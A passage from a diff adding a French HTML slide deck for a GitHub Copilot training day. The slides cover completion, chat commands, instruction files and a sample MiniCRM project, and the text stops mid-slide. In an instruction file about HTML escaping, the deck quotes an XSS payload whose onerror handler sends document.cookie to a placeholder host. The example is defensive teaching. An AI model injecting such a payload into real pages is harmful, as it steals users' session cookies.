@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GitHub Copilot — L'IA pour les développeurs</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#FFFFFF;
+  --bg2:#F2F7F7;
+  --accent:#0E8C86;
+  --accent2:#0B6E68;
+  --navy:#0B2D48;
+  --navy2:#08202F;
+  --text:#16212B;
+  --text2:#4B5C63;
+  --card:#EAF4F3;
+  --border:#D7E6E4;
+  --good:#1F9D67;
+  --warn:#B9740A;
+  --bad:#C1443B;
+  --code:#0F2733;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{height:100%;}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);overflow:hidden;}
+.deck{position:relative;width:100vw;height:100vh;}
+.slide{position:absolute;inset:0;display:none;flex-direction:column;justify-content:center;padding:5.5vh 8vw;opacity:0;transition:opacity .25s ease;overflow-y:auto;}
+.slide.active{display:flex;opacity:1;}
+.slide-tag{font-size:.8rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent2);font-weight:700;margin-bottom:1rem;}
+.slide-title{font-size:2.1rem;font-weight:800;margin-bottom:1.2rem;line-height:1.22;max-width:94%;color:var(--navy);}
+.slide h3.subtitle{font-size:1.15rem;font-weight:400;color:var(--text2);margin-bottom:1rem;}
+ul.points{list-style:none;max-width:88%;}
+ul.points li{font-size:1.1rem;line-height:1.5;margin-bottom:.7rem;padding-left:1.7rem;position:relative;color:var(--text2);}
+ul.points li::before{content:"\203A";position:absolute;left:0;color:var(--accent2);font-weight:700;font-size:1.3rem;}
+ul.points li b, ul.points li strong{color:var(--text);font-weight:700;}
+ul.points ul{list-style:none;margin-top:.4rem;}
+ul.points ul li{font-size:.98rem;margin-bottom:.3rem;}
+ul.points ul li::before{content:"\2013";font-size:1rem;}
+.note{margin-top:1.2rem;padding:.85rem 1.2rem;background:var(--card);border-left:4px solid var(--accent);border-radius:6px;font-size:.98rem;color:var(--text2);max-width:88%;}
+.note b{color:var(--accent2);}
+.warn{margin-top:1.2rem;padding:.85rem 1.2rem;background:#FFF6E8;border-left:4px solid var(--warn);border-radius:6px;font-size:.98rem;color:var(--text2);max-width:88%;}
+.warn b{color:var(--warn);}
+.src{margin-top:.9rem;font-size:.85rem;color:var(--text2);max-width:88%;}
+.src a{color:var(--accent2);text-decoration:none;border-bottom:1px dotted var(--accent2);}
+.src a:hover{color:var(--navy);}
+.slide-cover{align-items:flex-start;background:radial-gradient(circle at 80% 20%, #E3F2F1 0%, var(--bg) 60%);}
+.cover-org{font-size:.92rem;letter-spacing:.18em;text-transform:uppercase;color:var(--accent2);margin-bottom:1.6rem;}
+.cover-title{font-size:3rem;font-weight:800;max-width:88%;line-height:1.16;margin-bottom:1rem;color:var(--navy);}
+.cover-sub{font-size:1.25rem;color:var(--text2);max-width:78%;margin-bottom:2rem;}
+.cover-meta{display:flex;gap:2.2rem;flex-wrap:wrap;font-size:.95rem;color:var(--text2);}
+.cover-meta span b{color:var(--navy);display:block;font-size:1.05rem;}
+.cover-contact{position:absolute;bottom:6vh;left:8vw;font-size:.95rem;color:var(--accent2);}
+.slide-divider{align-items:center;text-align:center;background:linear-gradient(135deg, var(--bg) 0%, #E7F3F2 100%);}
+.section-tag{font-size:1rem;letter-spacing:.2em;text-transform:uppercase;color:var(--accent2);margin-bottom:1rem;}
+.section-title{font-size:2.7rem;font-weight:800;max-width:84%;line-height:1.2;margin-bottom:1rem;color:var(--navy);}
+.section-sub{font-size:1.1rem;color:var(--text2);max-width:70%;}
+.section-num{font-size:5.2rem;font-weight:800;color:var(--border);position:absolute;top:6vh;right:8vw;}
+.slide-question{background:linear-gradient(135deg,#FFF8ED 0%, var(--bg) 100%);border-top:6px solid var(--warn);}
+.q-tag{font-size:.85rem;letter-spacing:.15em;text-transform:uppercase;color:var(--warn);font-weight:700;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem;}
+.q-question{font-size:1.55rem;font-weight:700;margin-bottom:1.2rem;max-width:90%;color:var(--navy);line-height:1.35;}
+.q-hint{font-size:1.02rem;color:var(--text2);max-width:86%;line-height:1.5;}
+.q-footer{margin-top:1.2rem;font-size:.92rem;color:var(--text2);font-style:italic;}
+.slide-anecdote{background:linear-gradient(135deg,#F0F8F7 0%, var(--bg) 100%);border-top:6px solid var(--accent);}
+.an-tag{font-size:.85rem;letter-spacing:.15em;text-transform:uppercase;color:var(--accent2);font-weight:700;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem;}
+.an-title{font-size:1.6rem;font-weight:700;margin-bottom:.9rem;max-width:90%;color:var(--navy);}
+.an-body{font-size:1.05rem;color:var(--text2);max-width:88%;line-height:1.55;}
+.an-body b{color:var(--text);}
+.slide-quote{align-items:center;text-align:center;background:linear-gradient(135deg,var(--navy) 0%, var(--navy2) 100%);color:#fff;}
+.slide-quote .mini-relance{color:#B9D6D3;border-top-color:#2A4C63;}
+.q-mark{font-size:3.6rem;color:var(--accent);line-height:1;margin-bottom:.5rem;font-family:Georgia,serif;}
+.quote-text{font-size:1.8rem;font-weight:600;max-width:80%;line-height:1.4;margin-bottom:1.2rem;}
+.quote-author{font-size:1.05rem;color:#B9D6D3;}
+.quote-author b{color:#fff;}
+.slide-demo{background:linear-gradient(135deg,#EAF4FE 0%, var(--bg) 100%);border-top:6px solid #2E7DD1;}
+.demo-tag{font-size:.85rem;letter-spacing:.15em;text-transform:uppercase;color:#2E7DD1;font-weight:700;margin-bottom:1rem;}
+.demo-title{font-size:1.6rem;font-weight:700;margin-bottom:.7rem;color:var(--navy);}
+.demo-link{display:inline-block;margin-top:.5rem;background:#2E7DD1;color:#fff;padding:.55rem 1.1rem;border-radius:8px;text-decoration:none;font-weight:600;font-size:.98rem;}
+.slide-exercice{background:linear-gradient(135deg,#F0F8F7 0%, var(--bg) 100%);border-top:6px solid var(--accent);}
+.exo-tag{font-size:.85rem;letter-spacing:.15em;text-transform:uppercase;color:var(--accent2);font-weight:700;margin-bottom:1rem;}
+.exo-title{font-size:1.8rem;font-weight:700;margin-bottom:.5rem;color:var(--navy);}
+.exo-duree{font-size:.98rem;color:var(--text2);margin-bottom:1.1rem;}
+.exo-steps{max-width:88%;padding-left:1.3rem;}
+.exo-steps li{font-size:1.05rem;color:var(--text2);margin-bottom:.55rem;line-height:1.45;}
+.exo-livrable{margin-top:1.2rem;padding:.85rem 1.1rem;background:var(--card);border-radius:8px;font-size:1rem;border-left:4px solid var(--good);}
+.slide-cta{align-items:center;text-align:center;background:radial-gradient(circle at 50% 30%, #E3F2F1 0%, var(--bg) 70%);}
+.slide-cta h2{font-size:2.4rem;font-weight:800;margin-bottom:1rem;color:var(--navy);}
+.slide-cta p{font-size:1.2rem;color:var(--text2);margin-bottom:1.6rem;}
+.cta-links{display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;margin-bottom:1.2rem;}
+.cta-links a{color:var(--accent2);text-decoration:none;font-size:1.05rem;font-weight:600;border-bottom:2px solid var(--accent);padding-bottom:2px;}
+table.cmp{border-collapse:collapse;max-width:96%;margin-top:.9rem;}
+table.cmp th, table.cmp td{border:1px solid var(--border);padding:.55rem .85rem;font-size:.95rem;text-align:left;}
+table.cmp th{background:var(--card);color:var(--accent2);}
+table.cmp td{color:var(--text2);}
+table.cmp td b{color:var(--text);}
+.two-col{display:flex;gap:2.2rem;max-width:96%;}
+.two-col .col{flex:1;}
+.two-col h4{color:var(--accent2);font-size:1.02rem;margin-bottom:.5rem;}
+.three-col{display:flex;gap:1.6rem;max-width:96%;}
+.three-col .col{flex:1;background:var(--card);border-radius:8px;padding:1rem 1.1rem;}
+.three-col h4{color:var(--accent2);font-size:1rem;margin-bottom:.45rem;}
+.three-col p{font-size:.93rem;color:var(--text2);line-height:1.45;}
+.schema-box{margin-top:1.1rem;max-width:94%;}
+.schema-box svg{max-width:100%;height:auto;}
+.slide-code{background:linear-gradient(135deg,#F4F8F8 0%, var(--bg) 100%);border-top:6px solid var(--navy);}
+.code-tag{font-size:.85rem;letter-spacing:.15em;text-transform:uppercase;color:var(--navy);font-weight:700;margin-bottom:.8rem;}
+pre.code{background:var(--code);color:#E8F1F0;border-radius:10px;padding:1.1rem 1.3rem;font-family:'JetBrains Mono',Consolas,monospace;font-size:.86rem;line-height:1.55;overflow-x:auto;max-width:96%;white-space:pre;}
+pre.code .cm{color:#7FB3AE;}
+pre.code .kw{color:#7FC7FF;font-weight:600;}
+pre.code .st{color:#F2C57C;}
+pre.code .fn{color:#9FE3D0;}
+.file-path{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--accent2);margin-bottom:.5rem;}
+code.inline{font-family:'JetBrains Mono',monospace;background:var(--card);color:var(--accent2);padding:.1rem .35rem;border-radius:4px;font-size:.9em;}
+.progress-wrap{position:fixed;top:0;left:0;width:100%;height:4px;background:var(--border);z-index:50;}
+#progress{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--navy));transition:width .2s ease;}
+#counter{position:fixed;bottom:1.3vh;right:2vw;font-size:.78rem;color:var(--text2);z-index:50;letter-spacing:.05em;}
+.navbtn{position:fixed;top:50%;transform:translateY(-50%);z-index:50;background:var(--card);border:1px solid var(--border);color:var(--navy);width:40px;height:40px;border-radius:50%;cursor:pointer;font-size:1.15rem;display:flex;align-items:center;justify-content:center;opacity:.6;transition:opacity .2s;}
+.navbtn:hover{opacity:1;}
+#prevBtn{left:1.2vw;} #nextBtn{right:1.2vw;}
+.brand-mark{position:fixed;bottom:1.3vh;left:2vw;font-size:.7rem;color:#9FBDBA;letter-spacing:.1em;z-index:50;}
+.pdf-btn{position:fixed;top:1.3vh;right:2vw;z-index:60;background:var(--accent);color:#FFFFFF;border:none;border-radius:8px;padding:.5rem 1rem;font-family:'Inter',sans-serif;font-size:.82rem;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:.4rem;box-shadow:0 2px 8px rgba(11,45,72,.25);transition:background .2s;}
+.pdf-btn:hover{background:var(--accent2);}
+.amorce{margin-top:1.1rem;padding-top:.7rem;border-top:1px dashed var(--border);font-size:.93rem;color:var(--accent2);font-style:italic;max-width:88%;}
+.mini-relance{margin-top:1.1rem;padding-top:.7rem;border-top:1px dashed var(--border);font-size:.9rem;color:var(--accent2);font-style:italic;max-width:88%;}
+@media print{
+  .navbtn,#counter,.progress-wrap,.brand-mark,.pdf-btn{display:none !important;}
+  body{overflow:visible;}
+  .slide{position:relative;display:flex !important;opacity:1 !important;page-break-after:always;height:100vh;}
+}
+@media (max-width:900px){
+  .slide{padding:4vh 5vw 12vh;justify-content:flex-start;}
+  .cover-title{font-size:2rem;}
+  .slide-title{font-size:1.45rem;}
+  .section-title{font-size:1.7rem;}
+  .section-num{font-size:3rem;top:3vh;right:5vw;}
+  .two-col,.three-col{flex-direction:column;gap:1rem;}
+  ul.points,.note,.warn,.src,.amorce,.mini-relance,.exo-steps{max-width:100%;}
+  ul.points li{font-size:1rem;}
+  .q-question{font-size:1.25rem;}
+  .quote-text{font-size:1.35rem;max-width:100%;}
+  pre.code{font-size:.68rem;padding:.8rem .9rem;}
+  table.cmp{display:block;overflow-x:auto;max-width:100%;}
+  .pdf-btn,.navbtn{display:none;}
+  .brand-mark{max-width:60%;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;}
+  .cover-contact{position:static;margin-top:1.5rem;}
+}
+
+</style>
+</head>
+<body>
+<div class="progress-wrap"><div id="progress"></div></div>
+<button class="navbtn" id="prevBtn">&lsaquo;</button>
+<button class="navbtn" id="nextBtn">&rsaquo;</button>
+<button class="pdf-btn" id="pdfBtn" title="Raccourci clavier : P">&#11015; Exporter en PDF</button>
+<div id="counter">1 / 1</div>
+<div class="brand-mark">GITHUB COPILOT · FORMATION OUTILS · DIGITAL HOUSE COMPANY</div>
+
+<div class="deck">
+<section class="slide slide-cover active">
+<div class="cover-org">Digital House Company · Formation outils</div>
+<h1 class="cover-title">GitHub Copilot, de la complétion au mode agent</h1>
+<p class="cover-sub">L'assistant qui vit dans votre éditeur. Quatre façons de l'utiliser, et une seule qui compte vraiment : celle où vous relisez.</p>
+<div class="cover-meta"><span><b>Durée</b> 7 heures</span><span><b>Niveau</b> débutant à intermédiaire</span><span><b>Code base</b> MiniCRM · 4 fonctions à compléter</span><span><b>Outil</b> VS Code</span></div>
+<div class="cover-contact">Kuate Joël Parfait · hello@dhcompany.pro</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Objectifs</div>
+<h2 class="slide-title">Ce que vous saurez faire ce soir</h2>
+<ul class="points"><li>Distinguer les <b>quatre modes</b> de Copilot, et savoir lequel utiliser quand.</li><li>Faire produire du code qui ressemble au vôtre, grâce aux fichiers d'instructions.</li><li>Utiliser le <b>chat en ligne</b> et le <b>mode Edits</b> sans quitter votre fichier.</li><li>Piloter le <b>mode agent</b> : lui laisser plusieurs fichiers, et relire le diff.</li><li>Écrire des <b>fichiers de prompt</b> réutilisables et les partager avec l'équipe.</li><li>Reconnaître, en trois secondes, une suggestion qu'il ne faut pas accepter.</li></ul>
+<div class="note">La journée se fait sur <b>MiniCRM</b>, une vraie application de 900 lignes avec 90 tests, dont <b>8 sont au rouge</b> : quatre fonctions vous attendent.</div>
+<div class="amorce">&#128172; Qui utilise Copilot tous les jours ? Qui l'a désactivé au bout d'une semaine ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Déroulé</div>
+<h2 class="slide-title">Au programme</h2>
+<div class="two-col"><div class="col"><h4>Matin</h4><ul class="points"><li>Ce que voit vraiment la complétion</li><li>Écrire un contrat avant d'écrire le code</li><li>Le chat, ses commandes et ses références</li><li>Les fichiers d'instructions du dépôt</li><li><b>Exercice 1</b> — compléter par la complétion</li></ul></div><div class="col"><h4>Après-midi</h4><ul class="points"><li>Chat en ligne, Edits, mode agent</li><li>Fichiers de prompt et agents personnalisés</li><li>MCP, revue de code, Copilot sur GitHub</li><li>Confidentialité : ce qui part réellement</li><li><b>Exercices 2 et 3</b> — agent et industrialisation</li></ul></div></div>
+<div class="amorce">&#128172; Sur quel mode aimeriez-vous être vraiment à l'aise ce soir ?</div>
+</section>
+<section class="slide slide-divider">
+<div class="section-num">1</div>
+<div class="section-tag">Module 1</div>
+<h2 class="section-title">La complétion, bien comprise</h2>
+<p class="section-sub">Le mode le plus utilisé, le plus sous-estimé, et celui qu'on pilote le moins.</p>
+</section>
+<section class="slide">
+<div class="slide-tag">Panorama</div>
+<h2 class="slide-title">Quatre modes, quatre unités de travail</h2>
+<table class="cmp"><tr><th>Mode</th><th>Comment on l'appelle</th><th>Unité</th><th>Le bon usage</th></tr><tr><td><b>Complétion</b></td><td>en tapant (texte gris)</td><td>la ligne, la fonction</td><td>Écrire vite ce qu'on sait déjà écrire</td></tr><tr><td><b>Chat en ligne</b></td><td><code class="inline">Ctrl+I</code></td><td>la sélection</td><td>Modifier un bloc sans quitter le fichier</td></tr><tr><td><b>Chat latéral</b></td><td><code class="inline">Ctrl+Alt+I</code></td><td>la conversation</td><td>Comprendre, explorer, décider</td></tr><tr><td><b>Edits / Agent</b></td><td><code class="inline">Ctrl+Shift+I</code></td><td>plusieurs fichiers</td><td>Une tâche entière, à relire intégralement</td></tr></table>
+<div class="note">La progression du jour suit ce tableau, de haut en bas. Le contrôle que vous gardez diminue à chaque ligne ; la relecture devient donc de plus en plus importante.</div>
+<div class="amorce">&#128172; Lequel de ces quatre utilisez-vous aujourd'hui ? Et les trois autres ?</div>
+</section>
+<section class="slide slide-code">
+<div class="code-tag">Mise en route</div>
+<h2 class="slide-title code-title">Installer, vérifier, régler</h2>
+<div class="file-path">VS Code</div>
+<pre class="code">1. Extensions -&gt; installer « GitHub Copilot » et « GitHub Copilot Chat »
+2. Se connecter : la fenêtre s'ouvre au premier démarrage
+3. Vérifier : l'icône Copilot en bas à droite doit être pleine, pas barrée
+
+<span class="cm"># Les trois réglages à faire tout de suite (Ctrl+Shift+P -&gt; Preferences: Open User Settings JSON)</span>
+
+{
+<span class="cm">  // Sans cette ligne, vos fichiers d'instructions ne sont pas lus.</span>
+  "github.copilot.chat.codeGeneration.useInstructionFiles": true,
+
+<span class="cm">  // Active les fichiers de prompt du dépôt (/nom-du-prompt).</span>
+  "chat.promptFiles": true,
+
+<span class="cm">  // Où chercher les instructions ciblées.</span>
+  "chat.instructionsFilesLocations": { ".github/instructions": true },
+
+<span class="cm">  // La complétion, activée là où elle sert.</span>
+  "github.copilot.enable": { "*": true, "plaintext": false, "json": false }
+}</pre>
+<div class="warn">Le premier réglage est celui que tout le monde oublie. Sans lui, vous écrivez des instructions de dépôt que personne ne lit — et vous concluez, à tort, qu'elles ne servent à rien.</div>
+<div class="amorce">&#128172; Vérifiez maintenant : ce réglage est-il actif chez vous ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Complétion</div>
+<h2 class="slide-title">Ce que voit réellement le texte gris</h2>
+<ul class="points"><li>Ce qui est <b>au-dessus</b> du curseur dans le fichier courant : c'est le signal le plus fort.</li><li>Ce qui est <b>en dessous</b>, dans une moindre mesure.</li><li>Les <b>fichiers ouverts</b> dans vos onglets — c'est pourquoi ouvrir un fichier voisin bien écrit améliore les suggestions, immédiatement.</li><li>Le <b>nom du fichier</b> et son extension.</li><li>Les <b>instructions du dépôt</b>, si elles existent (module 3).</li></ul>
+<div class="warn">Ce qu'il ne voit <b>pas</b> : le reste du dépôt, votre base de données, vos conventions non écrites. D'où le principal levier d'amélioration : <b>ouvrir les bons onglets</b> avant de commencer.</div>
+<div class="note">Test à faire tout de suite : fermez tous les onglets sauf un, écrivez une signature de fonction, notez la suggestion. Ouvrez ensuite un fichier voisin bien écrit, recommencez. La différence est visible.</div>
+<div class="amorce">&#128172; Combien d'onglets avez-vous ouverts en ce moment, et lesquels aident vraiment ?</div>
+</section>
+<section class="slide slide-code">
+<div class="code-tag">Méthode</div>
+<h2 class="slide-title code-title">Écrire le contrat avant le code</h2>
+<div class="file-path">js/statistiques.js</div>
+<pre class="code">/**
+ * meilleursClients() — le classement par montant.
+ *
+ * Règles :
+ *   - seuls les contacts au statut 'client' entrent dans le classement ;
+ *     un prospect à 50 000 € est une estimation, pas un revenu ;
+ *   - tri décroissant sur le montant ;
+ *   - on renvoie au plus « combien » entrées (5 par défaut).
+ *
+ * @param {Array} contacts
+ * @param {number} [combien=5]
+ * @returns {Array}
+ */
+function meilleursClients(contacts, combien) {
+<span class="cm">  // Le curseur est ici. La suggestion qui apparaît maintenant est bien</span>
+<span class="cm">  // meilleure que si la JSDoc n'existait pas : chaque règle ci-dessus</span>
+<span class="cm">  // réduit l'espace des réponses plausibles.</span>
+}</pre>
+<div class="note">C'est <b>la</b> technique du jour, et elle ne coûte rien : écrivez le contrat, laissez venir l'implémentation. Vous obtenez en prime une documentation que vous auriez dû écrire de toute façon.</div>
+<div class="amorce">&#128172; Écrivez-vous vos blocs JSDoc avant ou après le code ? Pourquoi ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Piloter</div>
+<h2 class="slide-title">Les raccourcis de la complétion</h2>
+<table class="cmp"><tr><th>Raccourci</th><th>Effet</th></tr><tr><td><code class="inline">Tab</code></td><td>Accepter la suggestion entière</td></tr><tr><td><code class="inline">Ctrl+→</code></td><td>Accepter <b>un mot seulement</b> — le raccourci le plus sous-utilisé</td></tr><tr><td><code class="inline">Échap</code></td><td>Refuser</td></tr><tr><td><code class="inline">Alt+]</code> / <code class="inline">Alt+[</code></td><td>Proposition suivante / précédente — elles diffèrent vraiment</td></tr><tr><td><code class="inline">Alt+\</code></td><td>Redemander une suggestion</td></tr><tr><td><code class="inline">Ctrl+Entrée</code></td><td>Ouvrir le panneau : plusieurs propositions côte à côte</td></tr></table>
+<div class="note"><code class="inline">Ctrl+→</code> change la façon de travailler : on accepte le début d'une suggestion, on corrige la suite soi-même. On garde la vitesse sans céder le contrôle.</div>
+<div class="warn"><code class="inline">Tab</code> réflexe est le premier défaut à corriger. Une suggestion acceptée sans lecture est une dette contractée sans le savoir.</div>
+<div class="amorce">&#128172; Combien de fois par jour appuyez-vous sur Tab sans avoir lu ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Jugement</div>
+<h2 class="slide-title">Reconnaître une mauvaise suggestion en trois secondes</h2>
+<ul class="points"><li><b>Elle appelle une fonction qui n'existe pas.</b> Le modèle invente des noms plausibles : <code class="inline">contacts.sortByAmount()</code> n'existe pas.</li><li><b>Elle importe une bibliothèque</b> que le projet n'utilise pas — <code class="inline">lodash</code>, <code class="inline">moment</code>, <code class="inline">date-fns</code>.</li><li><b>Elle ne traite pas le cas vide.</b> Une division sans garde, un <code class="inline">[0]</code> sans vérification de longueur.</li><li><b>Elle change de langue.</b> Des noms en anglais dans un projet en français : signe que vos instructions de dépôt ne sont pas lues.</li><li><b>Elle est trop longue.</b> Vingt lignes pour une fonction qui en demandait cinq : il a inventé des besoins.</li></ul>
+<div class="note">Ces cinq signaux se voient sans exécuter le code. Les repérer devient un réflexe en quelques jours — et c'est ce réflexe qui fait la différence entre un développeur augmenté et un développeur diminué.</div>
+<div class="amorce">&#128172; Lequel de ces cinq vous est déjà passé sous le nez ?</div>
+</section>
+<section class="slide slide-divider">
+<div class="section-num">2</div>
+<div class="section-tag">Module 2</div>
+<h2 class="section-title">Le chat, et l'art de la référence</h2>
+<p class="section-sub">Un chat qui ne sait pas de quoi vous parlez répond à côté. Les références règlent ce problème.</p>
+</section>
+<section class="slide">
+<div class="slide-tag">Chat</div>
+<h2 class="slide-title">Les commandes qui font gagner du temps</h2>
+<table class="cmp"><tr><th>Commande</th><th>Ce qu'elle fait</th><th>Le bon moment</th></tr><tr><td><code class="inline">/explain</code></td><td>Explique le code sélectionné</td><td>Reprendre un fichier écrit par quelqu'un d'autre</td></tr><tr><td><code class="inline">/fix</code></td><td>Propose une correction</td><td>Une erreur soulignée en rouge, un test au rouge</td></tr><tr><td><code class="inline">/tests</code></td><td>Génère des tests</td><td>Après avoir écrit une fonction — puis on relit les tests</td></tr><tr><td><code class="inline">/fixTestFailure</code></td><td>Diagnostique un test en échec</td><td>Quand on ne comprend pas pourquoi il échoue</td></tr><tr><td><code class="inline">/new</code></td><td>Échafaude un projet ou un fichier</td><td>Démarrer une structure, pas remplir un projet existant</td></tr><tr><td><code class="inline">/clear</code></td><td>Vide la conversation</td><td>Entre deux sujets sans rapport</td></tr><tr><td><code class="inline">/help</code></td><td>Rappelle ce qui est disponible</td><td>Le premier jour</td></tr></table>
+<div class="note"><code class="inline">/tests</code> mérite une mise en garde : il produit des tests qui <b>passent</b>, pas forcément des tests qui <b>servent</b>. Relisez-les en vous demandant : « lequel échouerait si je cassais la règle métier ? »</div>
+<div class="amorce">&#128172; Un test qui passe toujours, quoi qu'on fasse : à quoi sert-il ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Références</div>
+<h2 class="slide-title">Dire de quoi vous parlez</h2>
+<div class="two-col"><div class="col"><h4>Le contexte — <code class="inline">#</code></h4><ul class="points"><li><code class="inline">#file</code> — un fichier précis</li><li><code class="inline">#selection</code> — ce qui est sélectionné</li><li><code class="inline">#codebase</code> — cherche dans tout le dépôt</li><li><code class="inline">#changes</code> — les modifications en cours</li><li><code class="inline">#terminalLastCommand</code> — la dernière commande</li><li><code class="inline">#problems</code> — les erreurs de l'éditeur</li></ul></div><div class="col"><h4>Les participants — <code class="inline">@</code></h4><ul class="points"><li><code class="inline">@workspace</code> — l'expert de votre projet</li><li><code class="inline">@vscode</code> — l'éditeur lui-même</li><li><code class="inline">@terminal</code> — les commandes shell</li><li><code class="inline">@github</code> — issues, PR, dépôts</li></ul></div></div>
+<div class="note"><code class="inline">#codebase</code> est celle qui change le plus les réponses : sans elle, le chat ne connaît que vos onglets ouverts. Avec elle, il cherche vraiment.</div>
+<div class="warn">Une référence coûte des tokens. <code class="inline">#codebase</code> sur une question qui ne concerne qu'un fichier ralentit la réponse sans l'améliorer.</div>
+<div class="amorce">&#128172; Que répondriez-vous à quelqu'un qui vous demande « pourquoi ça marche pas ? » sans rien montrer ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Générer des tests</div>
+<h2 class="slide-title">Ce qu'il faut vérifier avant de les garder</h2>
+<h3 class="subtitle"><code class="inline">/tests</code> produit des tests qui passent. Ce n'est pas la même chose que des tests qui servent.</h3>
+<ul class="points"><li><b>Le test échouerait-il si je cassais la règle ?</b> Cassez volontairement la fonction et relancez. Si tout reste vert, le test ne teste rien.</li><li><b>Teste-t-il un comportement, ou une implémentation ?</b> Un test qui vérifie qu'une fonction interne a été appelée casse au premier refactoring, sans qu'aucun bug n'existe.</li><li><b>Y a-t-il un cas limite ?</b> Liste vide, valeur nulle, division par zéro, date invalide, chaîne avec un accent ou une apostrophe.</li><li><b>Le nom dit-il quelque chose ?</b> « test1 » et « ça marche » sont des tests ratés : leur nom doit se lire comme une phrase de spécification.</li></ul>
+<div class="warn">Le pire résultat possible n'est pas un test manquant : c'est une suite de quarante tests verts qui ne protègent de rien. Elle donne une confiance que rien ne justifie.</div>
+<div class="amorce">&#128172; Cassez une fonction de votre projet. Combien de tests deviennent rouges ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Chat en ligne</div>
+<h2 class="slide-title">Modifier un bloc sans quitter le fichier</h2>
+<h3 class="subtitle"><code class="inline">Ctrl+I</code> sur une sélection. La modification apparaît en diff, directement dans le fichier : vert pour l'ajout, rouge pour la suppression.</h3>
+<ul class="points"><li><b>Sélectionnez d'abord</b>, demandez ensuite. Sans sélection, il devine — mal.</li><li>Formulez comme un ordre court : « ajoute la gestion du cas où la liste est vide », pas « peux-tu améliorer ce code ».</li><li><code class="inline">Ctrl+Entrée</code> accepte, <code class="inline">Échap</code> annule.</li><li>Vous pouvez enchaîner : demandez un ajustement sans repartir de zéro.</li></ul>
+<div class="note">C'est le mode le plus rentable de la journée : le contexte est évident (la sélection), la modification est petite, et le diff est sous vos yeux. <b>Trois conditions de bonne relecture réunies.</b></div>
+<div class="amorce">&#128172; Quel bloc de code de votre projet actuel mériterait ce traitement ?</div>
+</section>
+<section class="slide slide-divider">
+<div class="section-num">3</div>
+<div class="section-tag">Module 3</div>
+<h2 class="section-title">Faire produire du code qui ressemble au vôtre</h2>
+<p class="section-sub">Les fichiers d'instructions : le levier le plus rentable, et le plus ignoré.</p>
+</section>
+<section class="slide">
+<div class="slide-tag">Instructions</div>
+<h2 class="slide-title">Quatre fichiers, quatre portées</h2>
+<table class="cmp"><tr><th>Fichier</th><th>Lu quand</th><th>Ce qu'on y met</th></tr><tr><td><code class="inline">.github/copilot-instructions.md</code></td><td>À <b>chaque</b> demande, automatiquement</td><td>Le projet, la langue, l'architecture, les interdits</td></tr><tr><td><code class="inline">.github/instructions/*.instructions.md</code></td><td>Quand un fichier correspond à <code class="inline">applyTo</code></td><td>Les règles propres à un dossier : tests, vues, migrations</td></tr><tr><td><code class="inline">.github/prompts/*.prompt.md</code></td><td>Quand vous tapez <code class="inline">/nom</code></td><td>Une tâche répétitive, écrite une fois</td></tr><tr><td><code class="inline">AGENTS.md</code></td><td>Automatiquement, comme le premier</td><td>Le format ouvert, partagé avec d'autres agents</td></tr></table>
+<div class="note">Les trois premiers se versionnent : ils bénéficient à toute l'équipe, y compris à celles et ceux qui n'auront jamais lu la documentation de Copilot.</div>
+<div class="amorce">&#128172; Combien de conventions de votre équipe ne sont écrites nulle part ?</div>
+</section>
+<section class="slide slide-code">
+<div class="code-tag">Code · MiniCRM</div>
+<h2 class="slide-title code-title">Les instructions du dépôt, en entier</h2>
+<div class="file-path">codebase_minicrm/.github/copilot-instructions.md</div>
+<pre class="code"><span class="cm"># Instructions Copilot — MiniCRM</span>
+
+<span class="cm">## La langue</span>
+Tout est en **français** : noms de variables, de fonctions, commentaires,
+messages d'erreur, textes de test. Ne traduis pas vers l'anglais,
+ne renomme pas `depot` en `repository`.
+
+<span class="cm">## L'architecture</span>
+Quatre couches. Une couche ne connaît jamais celle du dessus.
+- js/modele.js — valider, normaliser. Ne touche ni au DOM ni au stockage.
+- js/depot.js — ranger, retrouver, trier. Aucune règle métier.
+- js/statistiques.js — calculer. Fonctions pures, aucun effet de bord.
+- js/vue.js — produire du HTML. Ne calcule rien.
+
+<span class="cm">## Les règles métier</span>
+1. Seul un contact au statut `client` compte dans le chiffre d'affaires.
+2. Un `client` doit avoir un montant supérieur à zéro.
+3. Deux contacts ne peuvent pas partager la même adresse e-mail.
+4. Un contact `inactif` n'apparaît jamais dans la liste « à rappeler ».
+
+<span class="cm">## Interdits</span>
+- Ajouter une dépendance npm, TypeScript, un bundler ou un framework.
+- Écrire dans du HTML une valeur non passée par Vue.echapper().
+- Modifier un test pour le faire passer.</pre>
+<div class="warn">Gardez ce fichier <b>court</b>. Des instructions longues sont diluées ; des instructions contradictoires sont ignorées. Une page, pas trois.</div>
+<div class="amorce">&#128172; Quelles seraient les quatre règles métier de votre projet ?</div>
+</section>
+<section class="slide slide-code">
+<div class="code-tag">Code · MiniCRM</div>
+<h2 class="slide-title code-title">Une instruction ciblée sur un seul dossier</h2>
+<div class="file-path">codebase_minicrm/.github/instructions/vue.instructions.md</div>
+<pre class="code">---
+applyTo: "js/vue.js"
+---
+
+<span class="cm"># Règle absolue de ce fichier</span>
+
+**Toute valeur venue de l'utilisateur passe par `echapper()` avant d'entrer
+dans une chaîne HTML.** Sans exception, y compris pour un identifiant
+ou un nombre.
+
+Sans cela, un contact nommé
+`&lt;img src=x onerror="fetch('https://ailleurs/'+document.cookie)"&gt;`
